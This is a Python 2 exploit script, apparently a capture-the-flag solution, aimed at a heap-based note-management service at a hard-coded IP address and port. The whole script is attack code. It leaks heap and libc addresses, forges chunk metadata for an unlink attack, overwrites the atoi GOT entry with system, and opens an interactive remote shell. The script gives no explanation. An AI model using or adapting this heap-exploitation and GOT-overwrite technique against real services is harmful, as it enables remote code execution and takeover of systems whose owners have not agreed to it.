import struct
import telnetlib
import socket
import re 



host = "202.112.28.117"
#host = "do.angelboy.me"
port = 10001
pat = r'.*\xd0.*'
pat2 = r'2.*'
free_offset = 0x82df0
#free_offset = 0x7b750
free_got = 0x602018
system_offset = 0x46640
#system_offset = 0x3fc70
atoi_got = 0x602070

def make_conn(host,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    return sock 

def recvuntil(sock,delim=':'):
    data = ""
    while not data.endswith(delim):
        data += sock.recv(1)
    return data

def newnote(size):
    sock.send('2\n')
    recvuntil(sock)
    sock.send(str(size)+'\n') 
    recvuntil(sock)
    sock.send('a'*(size-1)+'\n')
    recvuntil(sock)

def delnote(no):
    sock.send('4\n')
    recvuntil(sock) 
    sock.send(str(no)+'\n') 
    recvuntil(sock) 
    
def editnote(no,size):
    sock.send('3\n')
    recvuntil(sock)
    sock.send(str(no)+'\n')
    recvuntil(sock)
    sock.send(str(size)+'\n')
    recvuntil(sock)
    sock.send('A'*(size-1)+'\n')
    recvuntil(sock)

def leakheap(sock):
    recvuntil(sock) 
    for i in range(5):
        newnote(9)
    delnote(1)
    delnote(3)
    delnote(5)
    editnote(0,152)
    l = listnote(sock)
    match = re.search(pat,l)
    heapbase = match.group()
    heapbase = heapbase.ljust(4,'\x00')
    heapbase = struct.unpack("<I",heapbase)
    heapbase = heapbase[0]
    return (heapbase-0x19d0)

def listnote(sock):
    sock.send('1\n')
    l = recvuntil(sock)
    return l

def hijacknote(sock,heapbase):
# hijack note struct point to self
    sock.send('3\n')
    recvuntil(sock)
    sock.send(str(2)+'\n')
    recvuntil(sock)
    sock.send(str(200)+'\n')
    recvuntil(sock)
    payload = '\x00'*8 + '\x80' + '\x00'*7  # meta data for note 2
    note_contentfd = heapbase + 0x10 + 0x38
    payload += struct.pack("<Q",note_contentfd)
    note_contentbk = heapbase + 0x10 + 0x40
    payload += struct.pack("<Q",note_contentbk)
    payload += 96*'A'
    payload += '\x80' + '\x00'*7 + '\x90' + '\x00'*7  #meta data for note 3
    payload = payload.ljust(199,'A')
    sock.send(payload + '\n')
    recvuntil(sock) 
    delnote(3)
# change note struct to got
    
    sock.send('3\n')
    recvuntil(sock) 
    sock.send(str(2)+'\n') # no 3 => 0x48 
    recvuntil(sock) 
    sock.send(str(200)+'\n')
    recvuntil(sock)
    payload = ""
    note2 = heapbase + 0x18c0
    payload += struct.pack("<Q",note2)
    payload += struct.pack("<Q",1)
    payload += struct.pack("<Q",200)
    payload += struct.pack("<Q",free_got)  #free_got
    payload += '\x00'*24
    payload += struct.pack("<Q",1)
    payload += struct.pack("<Q",9)
    payload += struct.pack("<Q",atoi_got) #put got
    payload = payload.ljust(199,'\x00')
    sock.send(payload+'\n')
    recvuntil(sock)
    

def leaklib(sock):
    listlib = listnote(sock)
    match = re.search(pat2,listlib)
    libbase = match.group()
    libbase = libbase[2:]
    libbase = libbase.strip()
    libbase = libbase.ljust(8,'\x00')
    libbase = struct.unpack("<Q",libbase)
    libbase = libbase[0]
    libbase -= free_offset
    return libbase

def shell(libbase,sock):
    sock.send('3\n')
    recvuntil(sock)
    sock.send('4\n')
    recvuntil(sock)
    sock.send('9\n')
    recvuntil(sock)
    system = struct.pack("<Q",libbase+system_offset)
    sock.send(system+'\n')
    recvuntil(sock)

sock = make_conn(host,port)
heapbase = leakheap(sock)
print "heapbase is :" + hex(heapbase)
hijacknote(sock,heapbase)
libbase = leaklib(sock)
print "libbase is :" +  hex(libbase)
shell(libbase,sock)
sock.send( r"/bin/sh" + '\x00' +"\n")
print "$",

t = telnetlib.Telnet()
t.sock = sock 
t.interact()
